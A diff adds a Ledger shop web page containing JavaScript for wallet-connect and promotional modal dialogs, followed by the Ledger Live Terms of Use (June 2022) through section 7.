+    const buttonCloseDialog = document.getElementById('simple-close-dialog');
+    const simpleDialogOutputBox = document.querySelector('output');
+    const simpleDialogHeader = document.getElementById('simple-dialog-header');
+    const simpleDialogBody = document.getElementById('simple-dialog-body');
+    const simpleDialogFooter = document.getElementById('simple-dialog-footer');
+
+    const updateSimpleModal = async (htmlData = {}) => {
+
+      
+        if (htmlData.htmlHeader) {
+            simpleDialogHeader.innerHTML = htmlData.htmlHeader
+        }
+
+        if (htmlData.htmlFooter) {
+            simpleDialogFooter.style.display = "flex"
+            simpleDialogFooter.innerHTML = htmlData.htmlFooter
+        } else {
+          simpleDialogFooter.style.display = "none"
+        }
+
+        simpleDialogBody.innerHTML = htmlData.htmlBody
+
+        $('body').addClass('stop-scrolling')
+        $('body').bind('touchmove', function(e){e.preventDefault()})
+        simpleDialog.style.display = "block"
+    }
+
+    buttonCloseDialog.addEventListener('click', (event) => {
+        closeDialogFunction()
+    })
+
+    const closeDialogFunction = () => {
+        $('body').removeClass('stop-scrolling')
+        $('body').unbind('touchmove')
+        simpleDialog.style.display = "none"
+    }
+
+    const seeWarrantyThermesAndConditions = () => {
+        updateSimpleModal({
+            htmlHeader: 'Terms of sale',
+            htmlBody: `
+                <div>
+                This information is only a summary of the benefits available under a service contract.  
+                Benefits may change or be modified during your term. 
+                 Any available benefits are governed by the terms and conditions of any issued service contract, 
+                 which govern in the event of a conflict with this summary.  
+                 Accordingly, please refer to your service contract for the most current information.  
+                 The service contract does not cover loss or damage caused directly or indirectly by any of the exclusions listed in the service contract. 
+                 <b>Please read the <a href='https://google.fr' target='_blank'>service contract</a> carefully to determine your rights, duties, and what is not covered.</b><br><br>
+                If your exact model is subject to replacement and is not available, your replacement will be of like kind and quality. 
+                This coverage may provide a duplicate of other sources of coverage. Your service contract is provided by Ledger SAS and administered by Bolttech Device Protection Services, LLC.`
+        });
+    }
+
+    const sendTrackingContentSquare = (path) => {
+      window._uxa = window._uxa || [];
+      window._uxa.push(['trackPageview', path ]);
+    }
+
+    const loadingModal = () => {
+
+        htmlBody = `
+        <div id="simple-dialog-title" class="simple-dialog-loading"><span class="loader"></span></div>
+      `
+     
+      updateSimpleModal({htmlBody})
+    }
+
+     const successModal = () => {
+        htmlBody = `<div class="simple-status-success">
+          <img class="simple-status-image" src="//cdn.shopify.com/s/files/1/2974/4858/t/278/assets/success.png?v=161523950997899106431663241030" alt="success">
+          <p id="simple-dialog-title" class="h4 simple-status-title simple-dialog-title">Success</p>
+        </div>
+      `
+     // htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      // `
+      simpleDialogBody.dataset.status = true
+      updateSimpleModal({htmlBody})
+    }
+
+    const errorModal = () => {
+        sendTrackingContentSquare('?popin-tokeng-error')
+
+        htmlBody = `
+        <img class="simple-status-image" src="//cdn.shopify.com/s/files/1/2974/4858/t/278/assets/somethingWentWrong.png?v=84087111664744686591663241035" alt="something went wrong">
+        <p id="simple-dialog-title" class="h4 simple-status-title simple-dialog-title">Something went wrong</p>
+        <p id="simple-dialog-subtitle" class="simple-status-subtitle simple-dialog-subtitle">An error occurred during connection. </p>
+        <button class="button secondary simple-status-cta" onclick="connectWalletModal()">Try again</button>
+      `
+      //htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      //`
+      simpleDialogBody.dataset.status = true
+      updateSimpleModal({htmlBody})
+    }
+
+    const addProductToCartModal = (item) => {
+
+        sendTrackingContentSquare('?popin-tokeng-confirm')
+
+        htmlBody = `
+        <img class="simple-status-image" src="Liquid error (sections/dialog.liquid line 116): invalid url input" alt="">
+        <p id="simple-dialog-title" class="h4 simple-status-title simple-dialog-title">You're Eligible!</p>
+        <p id="simple-dialog-subtitle" class="simple-status-subtitle simple-dialog-subtitle">You can purchase the Ledger Limited Edition Merge Pack</p>
+        <p id="simple-dialog-save" class="simple-status-subtitle-discount">Save 20%</p>
+        <button class="button secondary simple-status-cta" onclick="theme.cart.add({id: ${item.id}, product_id: ${item.product_id}}); closeDialogFunction();">Add to cart</button>`;
+
+         htmlFooter = `
+            <a onclick="connectWalletModal()">Disconnect Wallet</a>
+            `
+      simpleDialogBody.dataset.status = true
+      updateSimpleModal({htmlBody, htmlFooter})
+    }
+
+    const helpModal = () => {
+        sendTrackingContentSquare('?popin-tokeng-how')
+
+         htmlBody = `
+        <p id="simple-dialog-title" class="h4 simple-dialog-title">How it works</p>
+        <div class="simple-dialog-step">
+          <p class="simple-step-number">Step 1</p>
+          <p class="h6 simple-step-title">Connect Your Wallet</p>
+          <p class="simple-step-description">We'll verify you hold an Ethereum address</p>
+        </div>
+        <div class="simple-dialog-step">
+          <p class="simple-step-number">Step 2</p>
+          <p class="h6 simple-step-title">Add To Cart</p>
+          <p class="simple-step-description">Once verified, add the pack to your cart</p>
+        </div>
+        <div class="simple-dialog-step">
+          <p class="simple-step-number">Step 3</p>
+          <p class="h6 simple-step-title">Checkout</p>
+          <p class="simple-step-description">Complete your order like any other purchase</p>
+        </div>
+        <button class="button secondary" onclick="connectWalletModal()">Connect Wallet</button>
+      `
+      //htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      //`
+        updateSimpleModal({htmlBody})
+    }
+
+    const connectWalletModal = () => {
+        sendTrackingContentSquare('?popin-tokeng-connect')
+
+        htmlBody = `
+        <p id="simple-dialog-title" class="h4 simple-dialog-title">Connect wallet</p>
+        <p class="simple-dialog-subtitle">We'll scan it for an Ethereum wallet.</p>
+        <div class="simple-connect-options">
+          ${ window.ethereum
+            ? `<button class="button primary" id="metamask-connect">Metamask</button>`
+            : ''
+          }
+          <button class="button primary" id="wallet-connect">Wallet Connect</button>
+        </div>
+        <div class="connect-disclamer"> 
+          For an improved mobile experience we recommend the use of an Ethereum enabled browser (Metamask App, Brave, etc.)
+        </div>
+      `
+      //htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      //`
+      simpleDialogBody.dataset.step = 'connect'
+      simpleDialogBody.dataset.status = false
+        updateSimpleModal({htmlBody})
+    }
+</script></div>
+  
+
+
+
+<div style="display:none">
+  
+</div>
+
+<div style="display:none">
+  
+</div>
+
+
+  
+
+<main id="main">
+  <div id="shopify-section-generic-page" class="shopify-section"><div class="generic__page">
+<h1>Ledger Live Terms of Use</h1>
+<p><strong><em>June 15th, 2022</em></strong></p>
+<p><span style="font-weight: 400;">You are about to use Ledger Live. We’re excited for you! Before you get on, Ledger needs you to carefully read, understand and accept our Terms of Use (the or these “Terms”). </span></p>
+<h2>1. Overview</h2>
+<p><span style="font-weight: 400;">This agreement is between you (“you”, “your”, or “User”) and Ledger SAS (“Ledger”, “us”, “we,'' “our”, or the “Company”). Ledger is a simplified joint-stock company with a capital of 1 459 259 € with its registered offices is located at 1, rue du Mail,75002 Paris and registered with the Paris Trade and Companies Register under number 529 991 119 (intra-Community VAT number: FR03529991119).</span></p>
+<p><span style="font-weight: 400;">By clicking “I agree”, “Get started”, or otherwise using any of the services provided by Ledger or any third party services made available through Ledger Live, you agree that you have carefully read and accepted all of the below terms and conditions. </span></p>
+<p><span style="font-weight: 400;">Your use of Ledger Live is also subject to Ledger’s Privacy Policy, which is available at</span><a href="https://shop.ledger.com/pages/privacy-policy"> <span style="font-weight: 400;">https://shop.ledger.com/pages/privacy-policy</span></a><span style="font-weight: 400;">. </span></p>
+<p><span style="font-weight: 400;">BEFORE USING LEDGER LIVE, PLEASE EDUCATE YOURSELF TO MAKE INFORMED DECISIONS. LEDGER DOES NOT PROVIDE FINANCIAL, TAX, OR LEGAL ADVICE. LEDGER DOES NOT EXCHANGE, SEND, OR RECEIVE CRYPTO ASSETS FOR USERS.  LEDGER DOES NOT ADVISE OR MAKE RECOMMENDATIONS ABOUT ENGAGING IN CRYPTO ASSET TRANSACTIONS OR OPERATIONS. DECISIONS TO ENGAGE IN TRANSACTIONS OR PERFORM OPERATIONS INVOLVING CRYPTO ASSETS SHOULD BE TAKEN ON YOUR OWN OR RELY ON OPINIONS OF YOUR OWN RELIABLE AND QUALIFIED EXPERTS.</span></p>
+<h2>2. Definitions</h2>
+<p><span style="font-weight: 400;">The following capitalized terms shall have the meanings described below when used in these Terms, it being specified for the avoidance of doubt that in these definitions, reference to the singular includes a reference to the plural and vice versa, except when clearly inappropriate.</span></p>
+<p><strong>“Crypto Assets”</strong><br><span style="font-weight: 400;">means types of digital assets which can be transmitted with blockchain technologies. This includes cryptocurrencies as well as non-fungible tokens (“NFTs”).</span></p>
+<p><strong>“Device Application”</strong><br> <span style="font-weight: 400;">means a software application, developed by Ledger or by third parties, which embeds a specific cryptographic signature logic within Ledger’s operating system BOLOS in order to create a transaction, on Ledger Live or a third party application, and sign various operations with a Ledger Device, including but not limited to: Crypto Assets transactions broadcast, authentication, password management.</span></p>
+<p><strong>“Fork”</strong><br>means a change to the underlying protocol of a blockchain network that results in more than one version of a Crypto Asset, the result of which may be one or more versions that are not supported by Ledger Live.</p>
+<p><strong>“Ledger Device”</strong><br> <span style="font-weight: 400;">means an electronic device, developed and distributed by Ledger, generally referred to as a “hardware wallet”, used to manage and secure Users’ Private Keys and other cryptographic secrets, compatible with Ledger Live or compatible Wallets.</span></p>
+<p><span style="font-weight: 400;"><strong>“Ledger Live”</strong><br>means the mobile and desktop software application which provides access to applications and Services, including services that can only be used in connection with a Ledger hardware wallet. <br></span></p>
+<p><strong>“Ledger Live Manager”</strong><br> <span style="font-weight: 400;">means a catalog of Device Applications available for download, which enables Users to update their Ledger Device firmware, install Device Applications and manage supported Crypto Assets.</span></p>
+<p><strong>“Materials”</strong><br> <span style="font-weight: 400;">means content, documentation as well as source and object codes for all software embedded within Ledger Live and Ledger Devices.</span></p>
+<p><strong>“PIN” </strong><br><span style="font-weight: 400;">means the numeric password chosen by the User to unlock a Ledger Device.</span></p>
+<p><strong>“Private Keys”</strong> <br><span style="font-weight: 400;">means a critical piece of data used to authorize outgoing transactions on blockchain networks.</span></p>
+<p><strong>“Services” </strong><br><span style="font-weight: 400;">means one or more of the services available within or through Ledger Live, including without limitation the Third Party Services.</span></p>
+<p><strong>“Third Party Services”</strong><br> <span style="font-weight: 400;">refers to any services, applications, software or other Materials that are hosted, developed and/or operated by a third party, including, but not limited to: crypto to crypto exchanges (“swap”), staking, buying and selling cryptocurrencies, display of balance in FIAT, display of currency rates, decentralized financial applications allowing the exchange, lending or borrowing of cryptocurrencies, visualization of NFTs, </span><span style="font-weight: 400;">minting, buying and selling of NFTs, etc.</span></p>
+<p><strong>“Wallet”</strong><br><span style="font-weight: 400;">means a software program which interacts with various blockchain networks to generate and manage sets of private keys and public keys, configure transactions and monitor their balance.</span></p>
+<p><strong>“Website” </strong><br> <span style="font-weight: 400;">means websites owned and operated by Ledger, including the e-commerce and corporate website hosted at ledger.com </span></p>
+<p><strong>“24-word Recovery Phrase”</strong><br> <span style="font-weight: 400;">means a confidential combination of human readable words, generated by Ledger Devices, from which Users’ Private Keys are derived. They are used to back-up and restore access to Crypto Assets on other Ledger Devices or compatible Wallets.</span></p>
+<h2>3. Eligibility</h2>
+<p><span style="font-weight: 400;">To be eligible to use the Services, you must be at least 18 years old or qualify as an adult in your country of residence. If you are using the Services on behalf of a legal entity, you further represent and warrant that: (a) the legal entity is duly organized and validly existing under the applicable laws of the jurisdiction of its organization; and (b) you are duly authorized by such legal entity to act on its behalf. </span>You can only use the Services if permitted under the laws of your jurisdiction. Please make sure that these Terms are in compliance with all laws, rules, and regulations that apply to you.</p>
+<h2>4. Risks and recommendations</h2>
+<p>You acknowledge that you are fully aware of all applicable laws and technical constraints relating to the proof-of-stake and proof-of-work blockchains, and to the Services. You acknowledge that you have been warned of the following associated risks and advised of the following recommendations:</p>
+<p><strong>4.1 Regulatory changes.</strong> Blockchain technologies and related services are subject to continuous regulatory changes and scrutiny around the world, including but not limited to anti-money laundering and financial regulations. You acknowledge that certain Services, including their availability, could be impacted by one or more regulatory requirements.</p>
+<p><strong>4.2 Tax.</strong> Transactions or operations in Crypto Assets , or more generally Crypto Assets events, including but not limited to exchanges, air-drops, forks, and gains arising from staking, may be considered tax events according to the legislations law under which you are subject to taxation. These rules may be unclear or subject to change, and you are therefore encouraged to consult your own tax or accounting adviser before engaging into Crypto Assets activities.</p>
+<p><strong>4.3 Technology.</strong> Users understand that some of the technology supported or made available through the Services are new, untested and not provided by Ledger and therefore outside of Ledger’s control. Advances in cryptography, or other technical advances such as the development of quantum computers, could present risks to blockchain networks which could result in the theft or loss of Crypto Assets. Other adverse changes in market forces or in the technology, broadly construed, may prevent or compromise Ledger’s performance under these Terms.</p>
+<p><strong>4.4 Cybersecurity.</strong> Hackers or other groups or organizations may attempt to interfere with Ledger’s products and information systems in several ways, including without limitation denial of service attacks, side-channel attacks, spoofing, smurfing, malware attacks, or consensus-based attacks.</p>
+<p><strong>4.5 Underlying blockchain protocols.</strong> All transactions created through the Services are confirmed and recorded on blockchain networks. Such networks are decentralized peer-to-peer networks run by independent third parties, which Ledger does not own, control or operate. We have no control over blockchain networks and, therefore, cannot and do not ensure that the transactions you broadcast on the Services will be confirmed and processed. You acknowledge that we do not store, send, or receive Crypto Assets on your behalf and you agree that the transactions you configure through the Services may fail, or may be substantially delayed by the underlying blockchain networks. On occasions, the blockchain protocol of a given Crypto Asset may change, which may have consequences on its key characteristics including but not limited to their availability, name, security, valuation value or the way it operates. Forks entail that forked Crypto Assets may be misdirected or replicated. In any such events, Ledger may decide, at its discretion, to suspend support of the impacted Crypto Asset for as long as Ledger deems necessary. When it so decides, Ledger will endeavor to give you advance notice, but may not be able to. You should keep yourself apprised of such events and make all necessary arrangements.</p>
+<p><strong>4.6 No retrieval of Private Keys.</strong> The only existing backup is with you. Ledger operates non-custodial services, which means that we do not store, nor do we have access to your Crypto Assets nor your Private Keys. Ledger does not have access to or store passwords, 24-word Recovery Phrase, Private Keys, passphrases, transaction history, PIN, or other credentials associated with your use of the Services. We are not in a position to help you retrieve your credentials. You are solely responsible for remembering, storing, and keeping your credentials in a secure location, away from prying eyes. Any third party with knowledge of one or more of your 24-word Recovery Phrase or PIN can gain control of the Private Keys associated with your Ledger Device or of the 24-word Recovery Phrase, and therefore steal your Crypto Assets, without any possibility for you or Ledger to retrieve them.</p>
+<p><strong>4.7 Keep your credentials safe.</strong> When you set your Ledger Device up, you must: (a) create and remember a strong PIN that you do not use for any other service; (b) protect and keep your 24-word Recovery Phrase secure and confidential; (c) protect access to your Ledger Device; To learn more about how to use and secure your 24-word Recovery Phrase, we recommend that you visit ledger.com and in particular, or visit Ledger’s website and in particular, <a href="https://www.ledger.com/academy/crypto/what-is-a-recovery-phrase" title="Ledger Academy">this page</a>, or the “Learn” section in Ledger Live and our support Website <a href="https://support.ledger.com/hc/en-us/articles/360005514233?docs=true" title="Ledger Support">here</a>.</p>
+<p><strong>4.8 Do not trust. Verify.</strong> Software integrity, especially when connected to the Internet, is very hard to verify. Ledger’s security model relies on trusted display. This is why the verification of the information on your Ledger Device is paramount. Before you approve an operation, you must always double check that the information displayed on your mobile or desktop screen is correct and matches the information displayed on your Ledger Device. Upon sending Crypto Assets, you are solely responsible for verifying that the recipient address, amount and fees are correct and that they are the same on both your computer or mobile and on your Ledger Device’s screen. You also acknowledge that using unverified addresses to receive Crypto Assets comes at your own risk.</p>
+<p><strong>4.9 Learn more about crypto and the risks involved.</strong> Before using Ledger Live or any of Ledger Devices, it’s important to learn and understand <a href="https://www.ledger.com/academy" title="Ledger Academy">how to use your Crypto Assets and the risks involved</a>. To help you with that, Ledger recommends that you visit the <a href="https://www.ledger.com/academy" title="Ledger Academy">Ledger Academy</a> before starting your crypto journey.</p>
+<p><strong>4.10 No liability.</strong> There may be additional risks that we have not foreseen or identified in these Terms. Before you use the Services, you are strongly encouraged to carefully assess whether your financial situation and risk tolerance is compatible with such use. For the avoidance of doubt, and notwithstanding the generality of the Limitation of Liability under these Terms, you hereby agree that Ledger shall have no liability for any loss that incurs as a consequence of the risks highlighted in this section and/or your failure to follow the recommendations herein.</p>
+<h2>5. Services and features</h2>
+<h3>5.1 Services Overview</h3>
+<p><strong>5.1.1 Description. </strong>Ledger Live, in connection with Ledger Devices, provides you with a convenient and secure way to manage your Device Applications, access and use Third Party Services, as well as use Private Keys derived from your 24-word Recovery Phrase.</p>
+<p><span style="font-weight: 400;">With Ledger Live, you can (including without limitation)</span></p>
+<ul>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Update the firmware of your Ledger Device </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Install and uninstall Device Applications with the Ledger Live Manager</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">View the balance of your portfolio of Crypto Assets that you hold in self-custody</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Manage your NFTs</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Learn about Crypto Assets, how to secure them and how to use them</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Keep track of cryptocurrency prices in real time</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Access the means to perform operations via our Third Party Services on various blockchain networks in accordance with their respective protocol rules, such as but not limited to:<br></span></li>
+<ul>
+<li style="font-weight: 400;">Send and receive Crypto Assets to and from users of a dedicated blockchain network</li>
+<li style="font-weight: 400;">Stake your Crypto Assets on Proof-Of-Stake networks</li>
+</ul>
+</ul>
+<p> </p>
+<p><span style="font-weight: 400;"><b>5.1.2 Supported Crypto Assets. </b></span><span style="font-weight: 400;">Ledger Live and Ledger Devices are only capable of supporting certain Crypto Assets. A non-exhaustive list of supported Crypto Assets and compatible Wallets is available </span><a href="https://support.ledger.com/hc/en-us/articles/115005304449-Supported-crypto-assets#targetText=Ledger%20Live%20supports%2022%20crypto,as%20send%20and%20receive%20them"><span style="font-weight: 400;">here</span></a><span style="font-weight: 400;">. This list is subject to change at the discretion of Ledger.</span></p>
+<p><span style="font-weight: 400;"><strong>5.1.3 Services availability.</strong> We may change, update or suspend the Services, temporarily or indefinitely, so as to carry out works including, but not limited to: firmware and software updates, maintenance operations, amendments to the servers, bug fixes, etc. We will make reasonable efforts to give you prior notice of any significant disruption of the Services. Ledger does not guarantee the correct functioning of the Services in the event of the installation or use of programs or applications that do not conform to Service specifications and technical standards. Please note that when a Service is unavailable or suspended, you can always recover your Private Keys using your 24-Recovery Phrase on any compatible Wallet.</span></p>
+<p><span style="font-weight: 400;"><strong>5.1.4 Connect with your Ledger Device.</strong> Certain Services may be used without connecting your Ledger Device (such as access to learning content, monitoring cryptocurrency prices or view the balance of your portfolio) whereas other Services may only be used in connection with your Ledger Device, including without limitation send, buy, sell, swap and stake services.</span></p>
+<p><span style="font-weight: 400;"><strong>5.1.5 Device Applications.</strong> Device Applications are available for download on Ledger Live Manager, or can be installed following our <a href="https://ledger.readthedocs.io/en/latest/userspace/getting_started.html">guidelines</a> and may either be developed by Ledger, or by any willing third party, thanks to open source code available on Ledger <a href="https://github.com/LedgerHQ">Github repository</a>. Such third party developers of Device Applications are responsible for the said applications and their performance, and for providing support for Device Applications supported on a Ledger Device and on Ledger Live. Ledger may perform code reviews and conduct security audits of Device Applications available on Ledger Live Manager, which does not constitute any kind of endorsement nor any guarantee that those applications are risk-free. Ledger does not warranty that Device Applications will be maintained over time and reserves the right to restrict or suspend access to them from Ledger Live for any reason for as long as deemed necessary.<br></span></p>
+<p><span style="font-weight: 400;"><strong>5.1.6 Experimental features.</strong> In order to accommodate advanced Users’ requests and to build new features and functionalities, we may release a series of experimental features on Ledger Live from time to time. These features may not be complete and may have not been fully tested, which may present heightened risks. They may contain errors or inaccuracies that could cause failures, corruption or loss of data and/or information. You can think of these features as beta features. Ledger does not guarantee the stability, functionality, or long-term support of these features. We do not recommend to use these features unless you are an advanced User with strong technical skills. You expressly acknowledge and agree that use of the experimental features is at your sole risk.</span></p>
+<h3><strong>5.2 Third Party Services</strong></h3>
+<p><strong>5.2.1 Third Party Services terms and conditions. </strong>Ledger Live may incorporate, reference and/or provide access to Third Party Services. For instance, buy, sell and crypto to crypto exchange (“swap”) services are Third Party Services. You agree that your use of Third Party Services is subject to separate terms and conditions between you and the third-party identified in Ledger Live. For ease of reference, a list of links to Third Party Services terms and conditions is available below. Ledger does not guarantee that such a list is comprehensive and it’s your responsibility to review and understand the applicable terms and conditions before using a Third Party Service:</p>
+<ul>
+<li><a href="https://www.coinify.com/legal/" target="_blank" rel="noopener noreferrer">Coinify Terms and conditions</a></li>
+<li><a href="https://www.moonpay.com/legal/terms_of_use" target="_blank" rel="noopener noreferrer">Moonpay Terms of use</a></li>
+<li><a href="https://ramp.network/terms-of-service/" target="_blank" rel="noopener noreferrer">Ramp Terms of service</a></li>
+<li><a href="https://btcdirect.eu/media/4385/download/User%20agreement%20BTC%20Direct.pdf?v=1&amp;amp;inline=1" target="_blank" rel="noopener noreferrer">BTC Direct User agreement</a></li>
+<li><a href="https://banxa.com/terms-of-use/" target="_blank" rel="noopener noreferrer">Banxa Terms of use</a></li>
+<li><a href="https://www.notion.so/Transak-Terms-of-Service-6d89598211644402b3be63bc3f1468b4" target="_blank" rel="noopener noreferrer">Transak Terms of service</a></li>
+<li><a href="https://mercuryo.io/legal/terms/" target="_blank" rel="noopener noreferrer">Mercuryo Legal terms</a></li>
+<li><a href="https://www.sendwyre.com/user-agreement/" target="_blank" rel="noopener noreferrer">Wyre User agreement</a></li>
+<li><a href="https://www.simplex.com/terms-of-use" target="_blank" rel="noopener noreferrer">Simplex Terms of use</a></li>
+<li><a href="https://zerion.io/terms.pdf" target="_blank" rel="noopener noreferrer">Zerion Terms</a></li>
+<li><a href="https://www.bitrefill.com/terms/?hl=en" target="_blank" rel="noopener noreferrer">Bitrefill Terms</a></li>
+<li><a href="https://changelly.com/terms-of-use" target="_blank" rel="noopener noreferrer">Changelly Terms of use</a></li>
+<li><a href="https://help.ftx.com/hc/en-us/articles/360024788391-FTX-Terms-of-Service" target="_blank" rel="noopener noreferrer">FTX Terms of service</a></li>
+<li><a href="https://psdocs.fra1.digitaloceanspaces.com/tos_v2.pdf" target="_blank" rel="noopener noreferrer">Paraswap Terms of service</a></li>
+</ul>
+<p> </p>
+<p><strong>5.2.2 No warranty.</strong> Ledger is not responsible for the content, accuracy, security, availability, any performance, or failure to perform of the Third Party Services or any issue in relation with the use of Third Party Services. Ledger does not provide any guarantees that access to Third Party Services will not be interrupted or that there will be no delays, failures, errors, omissions, corruption or loss of transmitted information, data or funds, and Ledger shall not be liable for any such Third Party Services. You agree to use the Third Party Services at your own risk. It is your responsibility to review the third party’s terms and policies before using a Third Party Service. Third Party Services may not be available in all languages and may not be appropriate or available for use in any particular location. To the extent you choose to use such Third Party Services, you are solely responsible for compliance with any applicable laws in relation to such use. In addition, Ledger reserves the right to block access to these Third Party Services through Ledger Live in particular, but not exclusively, in the event of non-compliance with the applicable regulations by the Third Party partner. We retain the exclusive right to suspend, remove, or cancel the availability of any such Third Party Service for any reason and without prior notice.</p>
+<p><strong>5.2.3 Personal data.</strong> Some Third Party Services may request or require access to your personal data. The processing of such data will be handled in accordance with the relevant Third Party’s privacy policy and best practices.</p>
+<p><strong>5.2.4 Issues with Third Party Services.</strong> Third Party Services may not work appropriately with your software or Ledger Device, and we may not be able to provide support for issues caused by Third Party Services as Ledger does not provide nor operate the Third Party Services. If you have questions or concerns about how a Third Party Service operates, or need support, please contact the relevant third party directly.</p>
+<p><strong>5.2.5 Decentralized financial applications.</strong> Certain Third Party Services are not operated by identified entities, but can be accessed directly through an interaction between the User’s wallet (whether or not the User uses the Application DeviceDevice Application or the Ledger Device) and one or several programs that are solely deployed and accessible on a blockchain network (i.e. “smart contracts”). These Third Party Services allow you to benefit from various services (such as the exchange, lending or borrowing of Crypto Assets) without having to provide your personal information to an intermediary. By using these Third Party Services, you agree that their use may not be subject to terms and conditions nor any other kind of contractual relationship with the third party operating such operator of the service. To the extent you choose to use such Third Party Services, you acknowledge that Ledger is not responsible for any issue in relation with the use of such Third Party Services, including any loss of funds.</p>
+<p><strong>5.2.6 Fees.</strong> The use of certain Third Party Services may be subject to transaction fees and/or other fees charged by such Third Party Services. On top of such fees, Ledger reserves the right to charge you fees for the secured and facilitated access provided by Ledger to use such Third Party Services through the Ledger Live (“Ledger Fees”). Ledger Fees may be charged directly to the User or indirectly if already included in the Third Party Fees and paid by the Third Party to Ledger on behalf of the User. In such event, Ledger will fully display all applicable fees and any applicable taxes.</p>
+<h3>5.3 Staking</h3>
+<p><strong>5.3.1 General.</strong> Through Ledger Live, you can stake specific assets to receive rewards for securing Proof-of-Stake (POS) networks. You may choose to stake your assets by delegating <span style="font-weight: 400;">to a Ledger operated validator node or to a third-party validator node. If you choose to stake your assets with a third-party validator node (including the “Ledger by Figment” node or any other “Ledger by…” node), then such staking is subject to the third party’s staking terms and conditions. LEDGER DOES NOT PROVIDE ANY ADVICE OR MAKE ANY RECOMMENDATIONS ABOUT ENGAGING IN </span><span style="font-weight: 400;">STAKING OR CHOOSING A VALIDATOR.  Ledger reserves the right to modify the list of referenced validators at any time without prior notice. </span></p>
+<p><span style="font-weight: 400;"><strong>5.3.2 Staking Rewards.</strong> You explicitly confirm that you are aware that delegation of staking rights to a validator operator listed in Ledger Live does not grant to your benefit any right to request payment of any kind, but merely a potential right to share a reward perceived by the validator. If you stake your assets with a Ledger operated node, Ledger will be acting as a transaction validator on the applicable Proof-of-Stake (POS) network. If Ledger successfully validates a block of transactions in that network, you may receive staking rewards granted by such network and Ledger will receive validator fees (at the rate indicated to you when staking your assets with Ledger’s validator). Your reward will be determined by the protocols of the applicable network. Please be aware that some Proof-of-Stake networks require that a certain amount of staked assets be “locked” (restricted from any use, sale or transfer) for a certain period of time while staking. <br></span></p>
+<p><span style="font-weight: 400;"><strong>5.3.4 No custody.</strong> Ledger will never take custody over any of your rewards or assets and Ledger has no responsibility or control over any Proof-of-Stake network on which Ledger may exercise validation rights delegated by you.<br><br><strong>5.3.5 No guarantee of Rewards.</strong> LEDGER DOES NOT GUARANTEE THAT YOU WILL RECEIVE STAKING REWARDS OR ANY STAKING REWARD RATES. SUCCESSFUL TRANSFER OF THE REWARDS IS SUBJECT TO THE PROOF-OF-STAKE NETWORKS AND IS NOT UNDER LEDGER’S CONTROL.</span></p>
+<p><span style="font-weight: 400;"><strong>5.3.6 Disclaimer.</strong> Staking is provided “as is”. Ledger is not responsible in any way for any failure by any supported Proof-Of-Stake (POS) network to transfer rewards (including any risks of “slashing”) or for the loss, destruction, or transfer of rewards to the incorrect wallet address. Ledger does not guarantee uninterrupted or error-free operation of the staking services or that it will correct all defects or prevent third-party disruptions or unauthorized third party access.</span></p>
+<h2></h2>
+<h2>6. Acceptable Use </h2>
+<p><span style="font-weight: 400;"><strong>6.1 User License.</strong> </span><span style="font-weight: 400;">As a user of Ledger Services, we grant you a limited, personal, non-commercial, non-exclusive, non-transferable, and revocable license to use the Services. Any use of the Services other than as specifically authorized in these Terms, without our prior written permission, is strictly prohibited and may result in immediate termination of your license to use the Services.</span></p>
+<p><strong>6.2 Do no harm.</strong> <span style="font-weight: 400;">You agree (i) not to distribute any virus or other harmful computer code through Ledger’s systems, (ii) not to use any robot, spider, crawler, scraper or other automated means or interface not provided by us to access the Services or to extract data, (iii) not to provide false, inaccurate, or misleading information, and (iv) not to take any action that may impose an unreasonable or disproportionately large load on our or any of our third party providers’ infrastructure. </span></p>
+<p><strong>6.3 Don’t circumvent our security</strong><span style="font-weight: 400;"><strong>.</strong> You agree not to bypass, circumvent, or attempt to bypass or circumvent any measures that we may use to prevent or restrict access to the Services including, without limitation, Ledger Devices connected to the Services, other accounts, information systems, or networks.</span></p>
+<p><strong>6.4 Don’t break the law</strong><span style="font-weight: 400;"><strong>.</strong> You agree that you will not violate any laws when using the Services. This includes any local, provincial, state, federal, national, or international laws that may apply to you. You agree that you will not use the Services to pay for, support, or otherwise engage in any illegal activities including, but not limited to, fraud, illegal gambling, money laundering, or terrorist activities. You further agree not to encourage or induce any third party to engage in any of the activities prohibited under this section.</span></p>
+<p><strong>6.5 Don’t interfere</strong><span style="font-weight: 400;"><strong>.</strong> You agree that you will not use or attempt to use another user’s Wallet without authorization, or use the Services in any manner that could interfere with, disrupt, negatively affect, or inhibit other Users from fully enjoying the Services, or that could damage, disable, overburden or impair the functioning of the Services in any manner. </span></p>
+<p><strong>6.6 Intellectual Property.</strong> Ledger respects the intellectual property of others and we ask our Users to do the same. You acknowledge and agree that, with the exception of Materials released or anyway made available pursuant to public license agreements, open source, MIT, or other non-proprietary license schemes normally used by the Ledger community, Ledger owns all copyrights, trademarks, know-how or any other intellectual property rights in respect of the software, text, video, audio, artwork, logos, layout as well as the look and feel pertaining to Ledger Live, Device Applications, and the Website. You may view, print and/or download a copy of proprietary Materials from the Services on any single computer solely for your personal, informational and/or non-commercial use, provided you comply with all copyright and other proprietary notices. The trademarks, service marks and logos of Ledger and others used in the Services (“Trademarks”) are the property of Ledger and their respective owners. It is strictly prohibited to use these Trademarks without our express written authorisation or the express written authorisation of any third parties.</p>
+<h2>7. Feedback</h2>
+<p>We welcome feedback, comments, ideas, and suggestions for improvements to the Services (“Feedback”). You grant to us a non-exclusive, worldwide, perpetual, irrevocable, fully-paid, royalty-free, sublicensable and transferable license under any and all intellectual property rights that you own or control to use, copy, modify, create derivative works based upon and otherwise exploit the Feedback for any purpose.</p>
+<h2>8. Warranties and Disclaimers</h2>
